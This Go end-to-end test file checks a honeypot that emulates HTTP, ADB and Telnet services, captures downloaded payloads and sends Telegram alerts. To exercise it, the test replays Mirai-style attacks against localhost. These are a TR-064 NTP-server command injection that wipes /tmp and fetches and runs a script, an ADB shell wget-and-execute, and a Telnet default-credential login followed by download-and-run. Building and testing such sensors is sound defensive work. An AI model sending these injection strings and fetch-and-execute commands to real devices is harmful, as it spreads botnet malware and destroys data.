package e2e

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/generalregulator/botbait/internal/alert"
	"github.com/generalregulator/botbait/internal/config"
	"github.com/generalregulator/botbait/internal/downloader"
	"github.com/generalregulator/botbait/internal/metrics"
	"github.com/generalregulator/botbait/internal/model"
	"github.com/generalregulator/botbait/internal/parser"
	"github.com/generalregulator/botbait/internal/payloadstore"
	"github.com/generalregulator/botbait/internal/pipeline"
	"github.com/generalregulator/botbait/internal/profile"
	"github.com/generalregulator/botbait/internal/ratelimit"
	"github.com/generalregulator/botbait/internal/server"
	"github.com/generalregulator/botbait/internal/session"
	"github.com/generalregulator/botbait/internal/store"
)

var portSeq atomic.Int64

func freePort(t *testing.T) int {
	t.Helper()
	base := 20000 + int(time.Now().UnixNano()/1000%6000)
	for i := 0; i < 2000; i++ {
		p := 20000 + (base-20000+int(portSeq.Add(1))*7)%11000
		ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", p))
		if err != nil {
			continue
		}
		ln.Close()
		return p
	}
	t.Fatal("no free port below the ephemeral range")
	return 0
}

type env struct {
	httpPort, adbPort, telnetPort int
	webPort                       int
	payloadURL                    string
	payloadSHA                    string
	tgMsgs                        chan string
	tgMarkup                      chan string
	logDir                        string
	m                             *metrics.Metrics
	cancel                        context.CancelFunc
	srvDone                       chan struct{}
	pipe                          *pipeline.Pipeline
	st                            *store.Store
	ps                            *payloadstore.Store
}

func startEnv(t *testing.T) *env {
	t.Helper()
	e := &env{m: &metrics.Metrics{}, tgMsgs: make(chan string, 16), tgMarkup: make(chan string, 16), srvDone: make(chan struct{})}

	payload := append([]byte("\x7fELF"), bytes.Repeat([]byte{0x90}, 300)...)
	sum := sha256.Sum256(payload)
	e.payloadSHA = hex.EncodeToString(sum[:])
	mal := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { w.Write(payload) }))
	t.Cleanup(mal.Close)
	e.payloadURL = mal.URL

	tg := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var body struct {
			Text        string
			ReplyMarkup json.RawMessage `json:"reply_markup"`
		}
		b, _ := io.ReadAll(r.Body)
		_ = json.Unmarshal(b, &body)
		e.tgMarkup <- string(body.ReplyMarkup)
		e.tgMsgs <- body.Text
		w.Write([]byte(`{"ok":true}`))
	}))
	t.Cleanup(tg.Close)

	e.httpPort, e.adbPort, e.telnetPort, e.webPort = freePort(t), freePort(t), freePort(t), freePort(t)
	tmp := t.TempDir()
	e.logDir = filepath.Join(tmp, "data")
	cfg := &config.Config{
		Ports:       []int{e.httpPort, e.adbPort, e.telnetPort, e.webPort},
		TelnetPorts: []int{e.telnetPort},
		WebPorts:    map[int]string{e.webPort: "hikvision"},
		PortLabels:  map[int]int{e.webPort: 80},
		MaxConns:    16, MaxConnsPerIP: 16, QueueSize: 16,
		ReadTimeout: 500 * time.Millisecond, WriteTimeout: time.Second,
		SessionTimeout: 2 * time.Second, MaxReadBytes: 64 * 1024, ShutdownTimeout: 5 * time.Second,
		RateLimit: 100, RateBurst: 100, RatePrefix4: 24, RatePrefix6: 64,
		PipelineWorkers: 4, EventQueue: 64, LogDir: e.logDir, StorePayloadMax: 8192,
		DownloadEnabled: true, PayloadDir: filepath.Join(tmp, "payloads"),
		DownloadTimeout: 2 * time.Second, MaxDownloadBytes: 1 << 20, MaxDownloadsPerEvent: 3,
		DownloadWorkers: 2, MaxStorageBytes: 64 << 20,
		CapturePush: true, MaxPushBytes: 4 << 20, PushSessionTimeout: 10 * time.Second,
		TelegramToken: "1:TOKEN", TelegramChatID: "42", AlertPayloadMax: 1200,
	}

	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	st, err := store.Open(cfg.LogDir)
	if err != nil {
		t.Fatal(err)
	}
	e.st = st
	ps, err := payloadstore.New(cfg.PayloadDir, cfg.MaxStorageBytes)
	if err != nil {
		t.Fatal(err)
	}
	e.ps = ps
	dl, err := downloader.New(downloader.Options{
		Store: ps, Dir: cfg.PayloadDir, Timeout: cfg.DownloadTimeout, MaxBytes: cfg.MaxDownloadBytes,
		MaxStorageBytes: cfg.MaxStorageBytes, Workers: cfg.DownloadWorkers,
		AllowPrivate: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	notifier := alert.NewNotifier("1:TOKEN", "42", tg.URL, 600, 50, time.Minute, 1200, e.m)
	e.pipe = pipeline.New(pipeline.Deps{Cfg: cfg, Log: log, Metrics: e.m, Download: dl, Notifier: notifier, Store: st})
	e.pipe.Start()

	lim := ratelimit.New(cfg.RateLimit, cfg.RateBurst, cfg.RatePrefix4, cfg.RatePrefix6)
	router, err := profile.Load("router-busybox", "e2e")
	if err != nil {
		t.Fatal(err)
	}
	srv := server.New(cfg, session.New(cfg, e.pipe, e.m, session.WithStore(ps), session.WithTelnetProfile(router)), lim, e.m, log)
	ctx, cancel := context.WithCancel(context.Background())
	e.cancel = cancel
	go func() { _ = srv.Run(ctx); close(e.srvDone) }()

	for _, p := range cfg.Ports {
		deadline := time.Now().Add(3 * time.Second)
		for {
			c, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", p))
			if err == nil {
				c.Close()
				break
			}
			if time.Now().After(deadline) {
				t.Fatalf("port %d never opened", p)
			}
			time.Sleep(20 * time.Millisecond)
		}
	}

	t.Cleanup(func() { e.cancel() })
	return e
}

func (e *env) shutdown(t *testing.T) []model.Event {
	t.Helper()
	e.cancel()
	select {
	case <-e.srvDone:
	case <-time.After(6 * time.Second):
		t.Fatal("server did not stop within the shutdown budget")
	}
	e.pipe.Shutdown(5 * time.Second)
	_ = e.st.Close()
	return readEvents(t, e.logDir)
}

func readEvents(t *testing.T, dir string) []model.Event {
	t.Helper()
	files, _ := filepath.Glob(filepath.Join(dir, "events-*.jsonl"))
	var out []model.Event
	for _, f := range files {
		fh, err := os.Open(f)
		if err != nil {
			t.Fatal(err)
		}
		sc := bufio.NewScanner(fh)
		sc.Buffer(make([]byte, 1<<20), 1<<20)
		for sc.Scan() {
			var ev model.Event
			if err := json.Unmarshal(sc.Bytes(), &ev); err != nil {
				t.Fatalf("bad JSONL line: %v", err)
			}
			out = append(out, ev)
		}
		fh.Close()
	}
	return out
}

func (e *env) waitAlert(t *testing.T) string {
	t.Helper()
	select {
	case m := <-e.tgMsgs:
		return m
	case <-time.After(8 * time.Second):
		t.Fatal("no Telegram alert received")
		return ""
	}
}

func dial(t *testing.T, port int) net.Conn {
	t.Helper()
	c, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 2*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { c.Close() })
	return c
}

func readUntil(t *testing.T, c net.Conn, want string) string {
	t.Helper()
	var sb strings.Builder
	buf := make([]byte, 1024)
	_ = c.SetReadDeadline(time.Now().Add(3 * time.Second))
	for !strings.Contains(sb.String(), want) {
		n, err := c.Read(buf)
		sb.Write(buf[:n])
		if err != nil {
			t.Fatalf("waiting for %q: %v (got %q)", want, err, sb.String())
		}
	}
	return sb.String()
}

func TestHoneypotEndToEnd(t *testing.T) {
	e := startEnv(t)

	body := "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"><SOAP-ENV:Body>" +
		"<u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\"><NewNTPServer1>`cd /tmp;rm -rf *;wget " + e.payloadURL +
		"/mips.sh;chmod +x mips.sh;sh mips.sh`</NewNTPServer1></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>"
	req := fmt.Sprintf("POST /UD/act?1 HTTP/1.1\r\nHost: 192.0.2.1:7547\r\nUser-Agent: Hello-World\r\n"+
		"SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", len(body), body)
	c := dial(t, e.httpPort)
	if _, err := c.Write([]byte(req)); err != nil {
		t.Fatal(err)
	}
	resp := readUntil(t, c, "Envelope")
	if !strings.HasPrefix(resp, "HTTP/1.1 200 OK") {
		t.Fatalf("unexpected HTTP reply: %q", resp)
	}
	msg := e.waitAlert(t)
	for _, want := range []string{
		fmt.Sprintf("HONEYPOT ALERT (%d/HTTP)", e.httpPort),
		"T1059.004 (Unix Shell)", "T1105 (Ingress Tool Transfer)", "T1190 (Exploit Public-Facing Application)",
		"[HTTP POST]", e.payloadURL + "/mips.sh", "SHA256: <code>" + e.payloadSHA + "</code>", "Hello-World",
		"<b>Attacker IP:</b> <code>127.0.0.1</code>",
	} {
		if !strings.Contains(msg, want) {
			t.Errorf("HTTP alert missing %q:\n%s", want, msg)
		}
	}
	if strings.Contains(msg, e.payloadSHA+".bin") {
		t.Errorf("the sensor-side file name must not be published:\n%s", msg)
	}
	select {
	case mk := <-e.tgMarkup:
		for _, w := range []string{"inline_keyboard", "VirusTotal", "AbuseIPDB", "Check-Host", "/ip-address/127.0.0.1"} {
			if !strings.Contains(mk, w) {
				t.Errorf("inline keyboard missing %q: %s", w, mk)
			}
		}
	case <-time.After(time.Second):
		t.Error("no reply_markup sent with the alert")
	}
	if strings.Contains(msg, "schemas.xmlsoap.org") && strings.Contains(strings.SplitN(msg, "🎯", 2)[1], "xmlsoap") {
		t.Errorf("XML namespace leaked into IOC section:\n%s", msg)
	}

	a := dial(t, e.adbPort)
	a.Write(parser.BuildADB("CNXN", 0x01000000, 4096, []byte("host::features=shell_v2\x00")))
	reply := readUntil(t, a, "device::")
	if !strings.HasPrefix(reply, "CNXN") {
		t.Fatalf("ADB handshake failed: %q", reply)
	}
	cmd := "shell:cd /data/local/tmp; wget " + e.payloadURL + "/x.arm7 -O x; chmod 777 x; ./x\x00"
	a.Write(parser.BuildADB("OPEN", 1, 0, []byte(cmd)))
	if r := readUntil(t, a, "OKAY"); !strings.Contains(r, "OKAY") {
		t.Fatalf("no OKAY after OPEN")
	}
	a.Close()
	adbAlert := e.waitAlert(t)
	if !strings.Contains(adbAlert, fmt.Sprintf("(%d/ADB)", e.adbPort)) || !strings.Contains(adbAlert, "T1059.004") ||
		!strings.Contains(adbAlert, "SHA256: <code>"+e.payloadSHA+"</code>") {
		t.Errorf("ADB alert wrong:\n%s", adbAlert)
	}

	tc := dial(t, e.telnetPort)
	readUntil(t, tc, "login: ")
	tc.Write([]byte("root\r\n"))
	readUntil(t, tc, "Password: ")
	tc.Write([]byte("xc3511\r\n"))
	readUntil(t, tc, "Login incorrect")
	tc.Write([]byte("admin\r\n"))
	readUntil(t, tc, "Password: ")
	tc.Write([]byte("admin\r\n"))
	readUntil(t, tc, "# ")
	tc.Write([]byte("/bin/busybox ECCHI\r\n"))
	readUntil(t, tc, "ECCHI: applet not found")
	tc.Write([]byte("cd /tmp; wget " + e.payloadURL + "/arm7; chmod +x arm7; ./arm7\r\n"))
	readUntil(t, tc, "# ")
	tc.Write([]byte("exit\r\n"))
	tc.Close()
	telnetAlert := e.waitAlert(t)
	if !strings.Contains(telnetAlert, fmt.Sprintf("(%d/TELNET)", e.telnetPort)) ||
		!strings.Contains(telnetAlert, "T1059.004") || !strings.Contains(telnetAlert, "T1110.001") {
		t.Errorf("Telnet alert wrong:\n%s", telnetAlert)
	}

	sl := dial(t, e.httpPort)
	sl.Write([]byte("G"))
	start := time.Now()
	_ = sl.SetReadDeadline(time.Now().Add(4 * time.Second))
	if _, err := sl.Read(make([]byte, 16)); err == nil {
		t.Fatal("server should not answer a stalled request")
	} else if ne, ok := err.(net.Error); ok && ne.Timeout() {
		t.Fatal("server kept a stalled connection open (client timed out first)")
	}
	if el := time.Since(start); el > 2500*time.Millisecond {
		t.Fatalf("stalled connection lingered %s", el)
	}

	idle := dial(t, e.httpPort)
	idle.Write([]byte("GET / HTTP/1.1\r\nHost: x\r\n"))
	time.Sleep(100 * time.Millisecond)
	t0 := time.Now()
	events := e.shutdown(t)
	if el := time.Since(t0); el > 3*time.Second {
		t.Fatalf("shutdown took %s", el)
	}

	var sawHTTP, sawADB, sawTelnet bool
	for _, ev := range events {
		switch {
		case ev.DstPort == e.httpPort && ev.HTTPPath == "/UD/act?1":
			sawHTTP = true
			if len(ev.Downloads) != 1 || !ev.Downloads[0].Success || ev.Downloads[0].SHA256 != e.payloadSHA || !ev.AlertSent {
				t.Errorf("HTTP event download/alert state wrong: %+v", ev.Downloads)
			}
		case ev.DstPort == e.adbPort && ev.Action == "ADB shell":
			sawADB = true
		case ev.DstPort == e.telnetPort && len(ev.Credentials) == 2:
			sawTelnet = true
		}
	}
	if !sawHTTP || !sawADB || !sawTelnet {
		t.Errorf("events missing from JSONL log: http=%v adb=%v telnet=%v (total %d)", sawHTTP, sawADB, sawTelnet, len(events))
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(e.logDir), "payloads", e.payloadSHA+".bin")); err != nil {
		t.Errorf("captured payload not on disk: %v", err)
	}

	if e.m.SessionPanics.Load() != 0 {
		t.Error("session panics recorded")
	}
	if e.m.ActiveSessions.Load() != 0 {
		t.Errorf("active sessions after shutdown: %d", e.m.ActiveSessions.Load())
	}
}

func TestConnectionRateLimitDropsFlood(t *testing.T) {
	cfg := &config.Config{
		Ports: []int{freePort(t)}, MaxConns: 4, MaxConnsPerIP: 100, QueueSize: 4,
		ReadTimeout: 200 * time.Millisecond, WriteTimeout: time.Second, SessionTimeout: time.Second,
		MaxReadBytes: 4096, ShutdownTimeout: 2 * time.Second,
	}
	m := &metrics.Metrics{}
	var mu sync.Mutex
	got := 0
	sink := sinkFunc(func(*model.Event) { mu.Lock(); got++; mu.Unlock() })
	lim := ratelimit.New(0.001, 3, 24, 64)
	srv := server.New(cfg, session.New(cfg, sink, m), lim, m, slog.New(slog.NewTextHandler(io.Discard, nil)))
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() { _ = srv.Run(ctx); close(done) }()
	time.Sleep(200 * time.Millisecond)

	for i := 0; i < 10; i++ {
		if c, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", cfg.Ports[0])); err == nil {
			c.Close()
		}
	}
	time.Sleep(600 * time.Millisecond)
	cancel()
	<-done

	if acc, lim := m.ConnAccepted.Load(), m.ConnRateLimited.Load(); acc != 3 || lim != 7 {
		t.Fatalf("accepted=%d rate_limited=%d, want 3/7", acc, lim)
	}
}

type sinkFunc func(*model.Event)

func (f sinkFunc) Submit(ev *model.Event) { f(ev) }
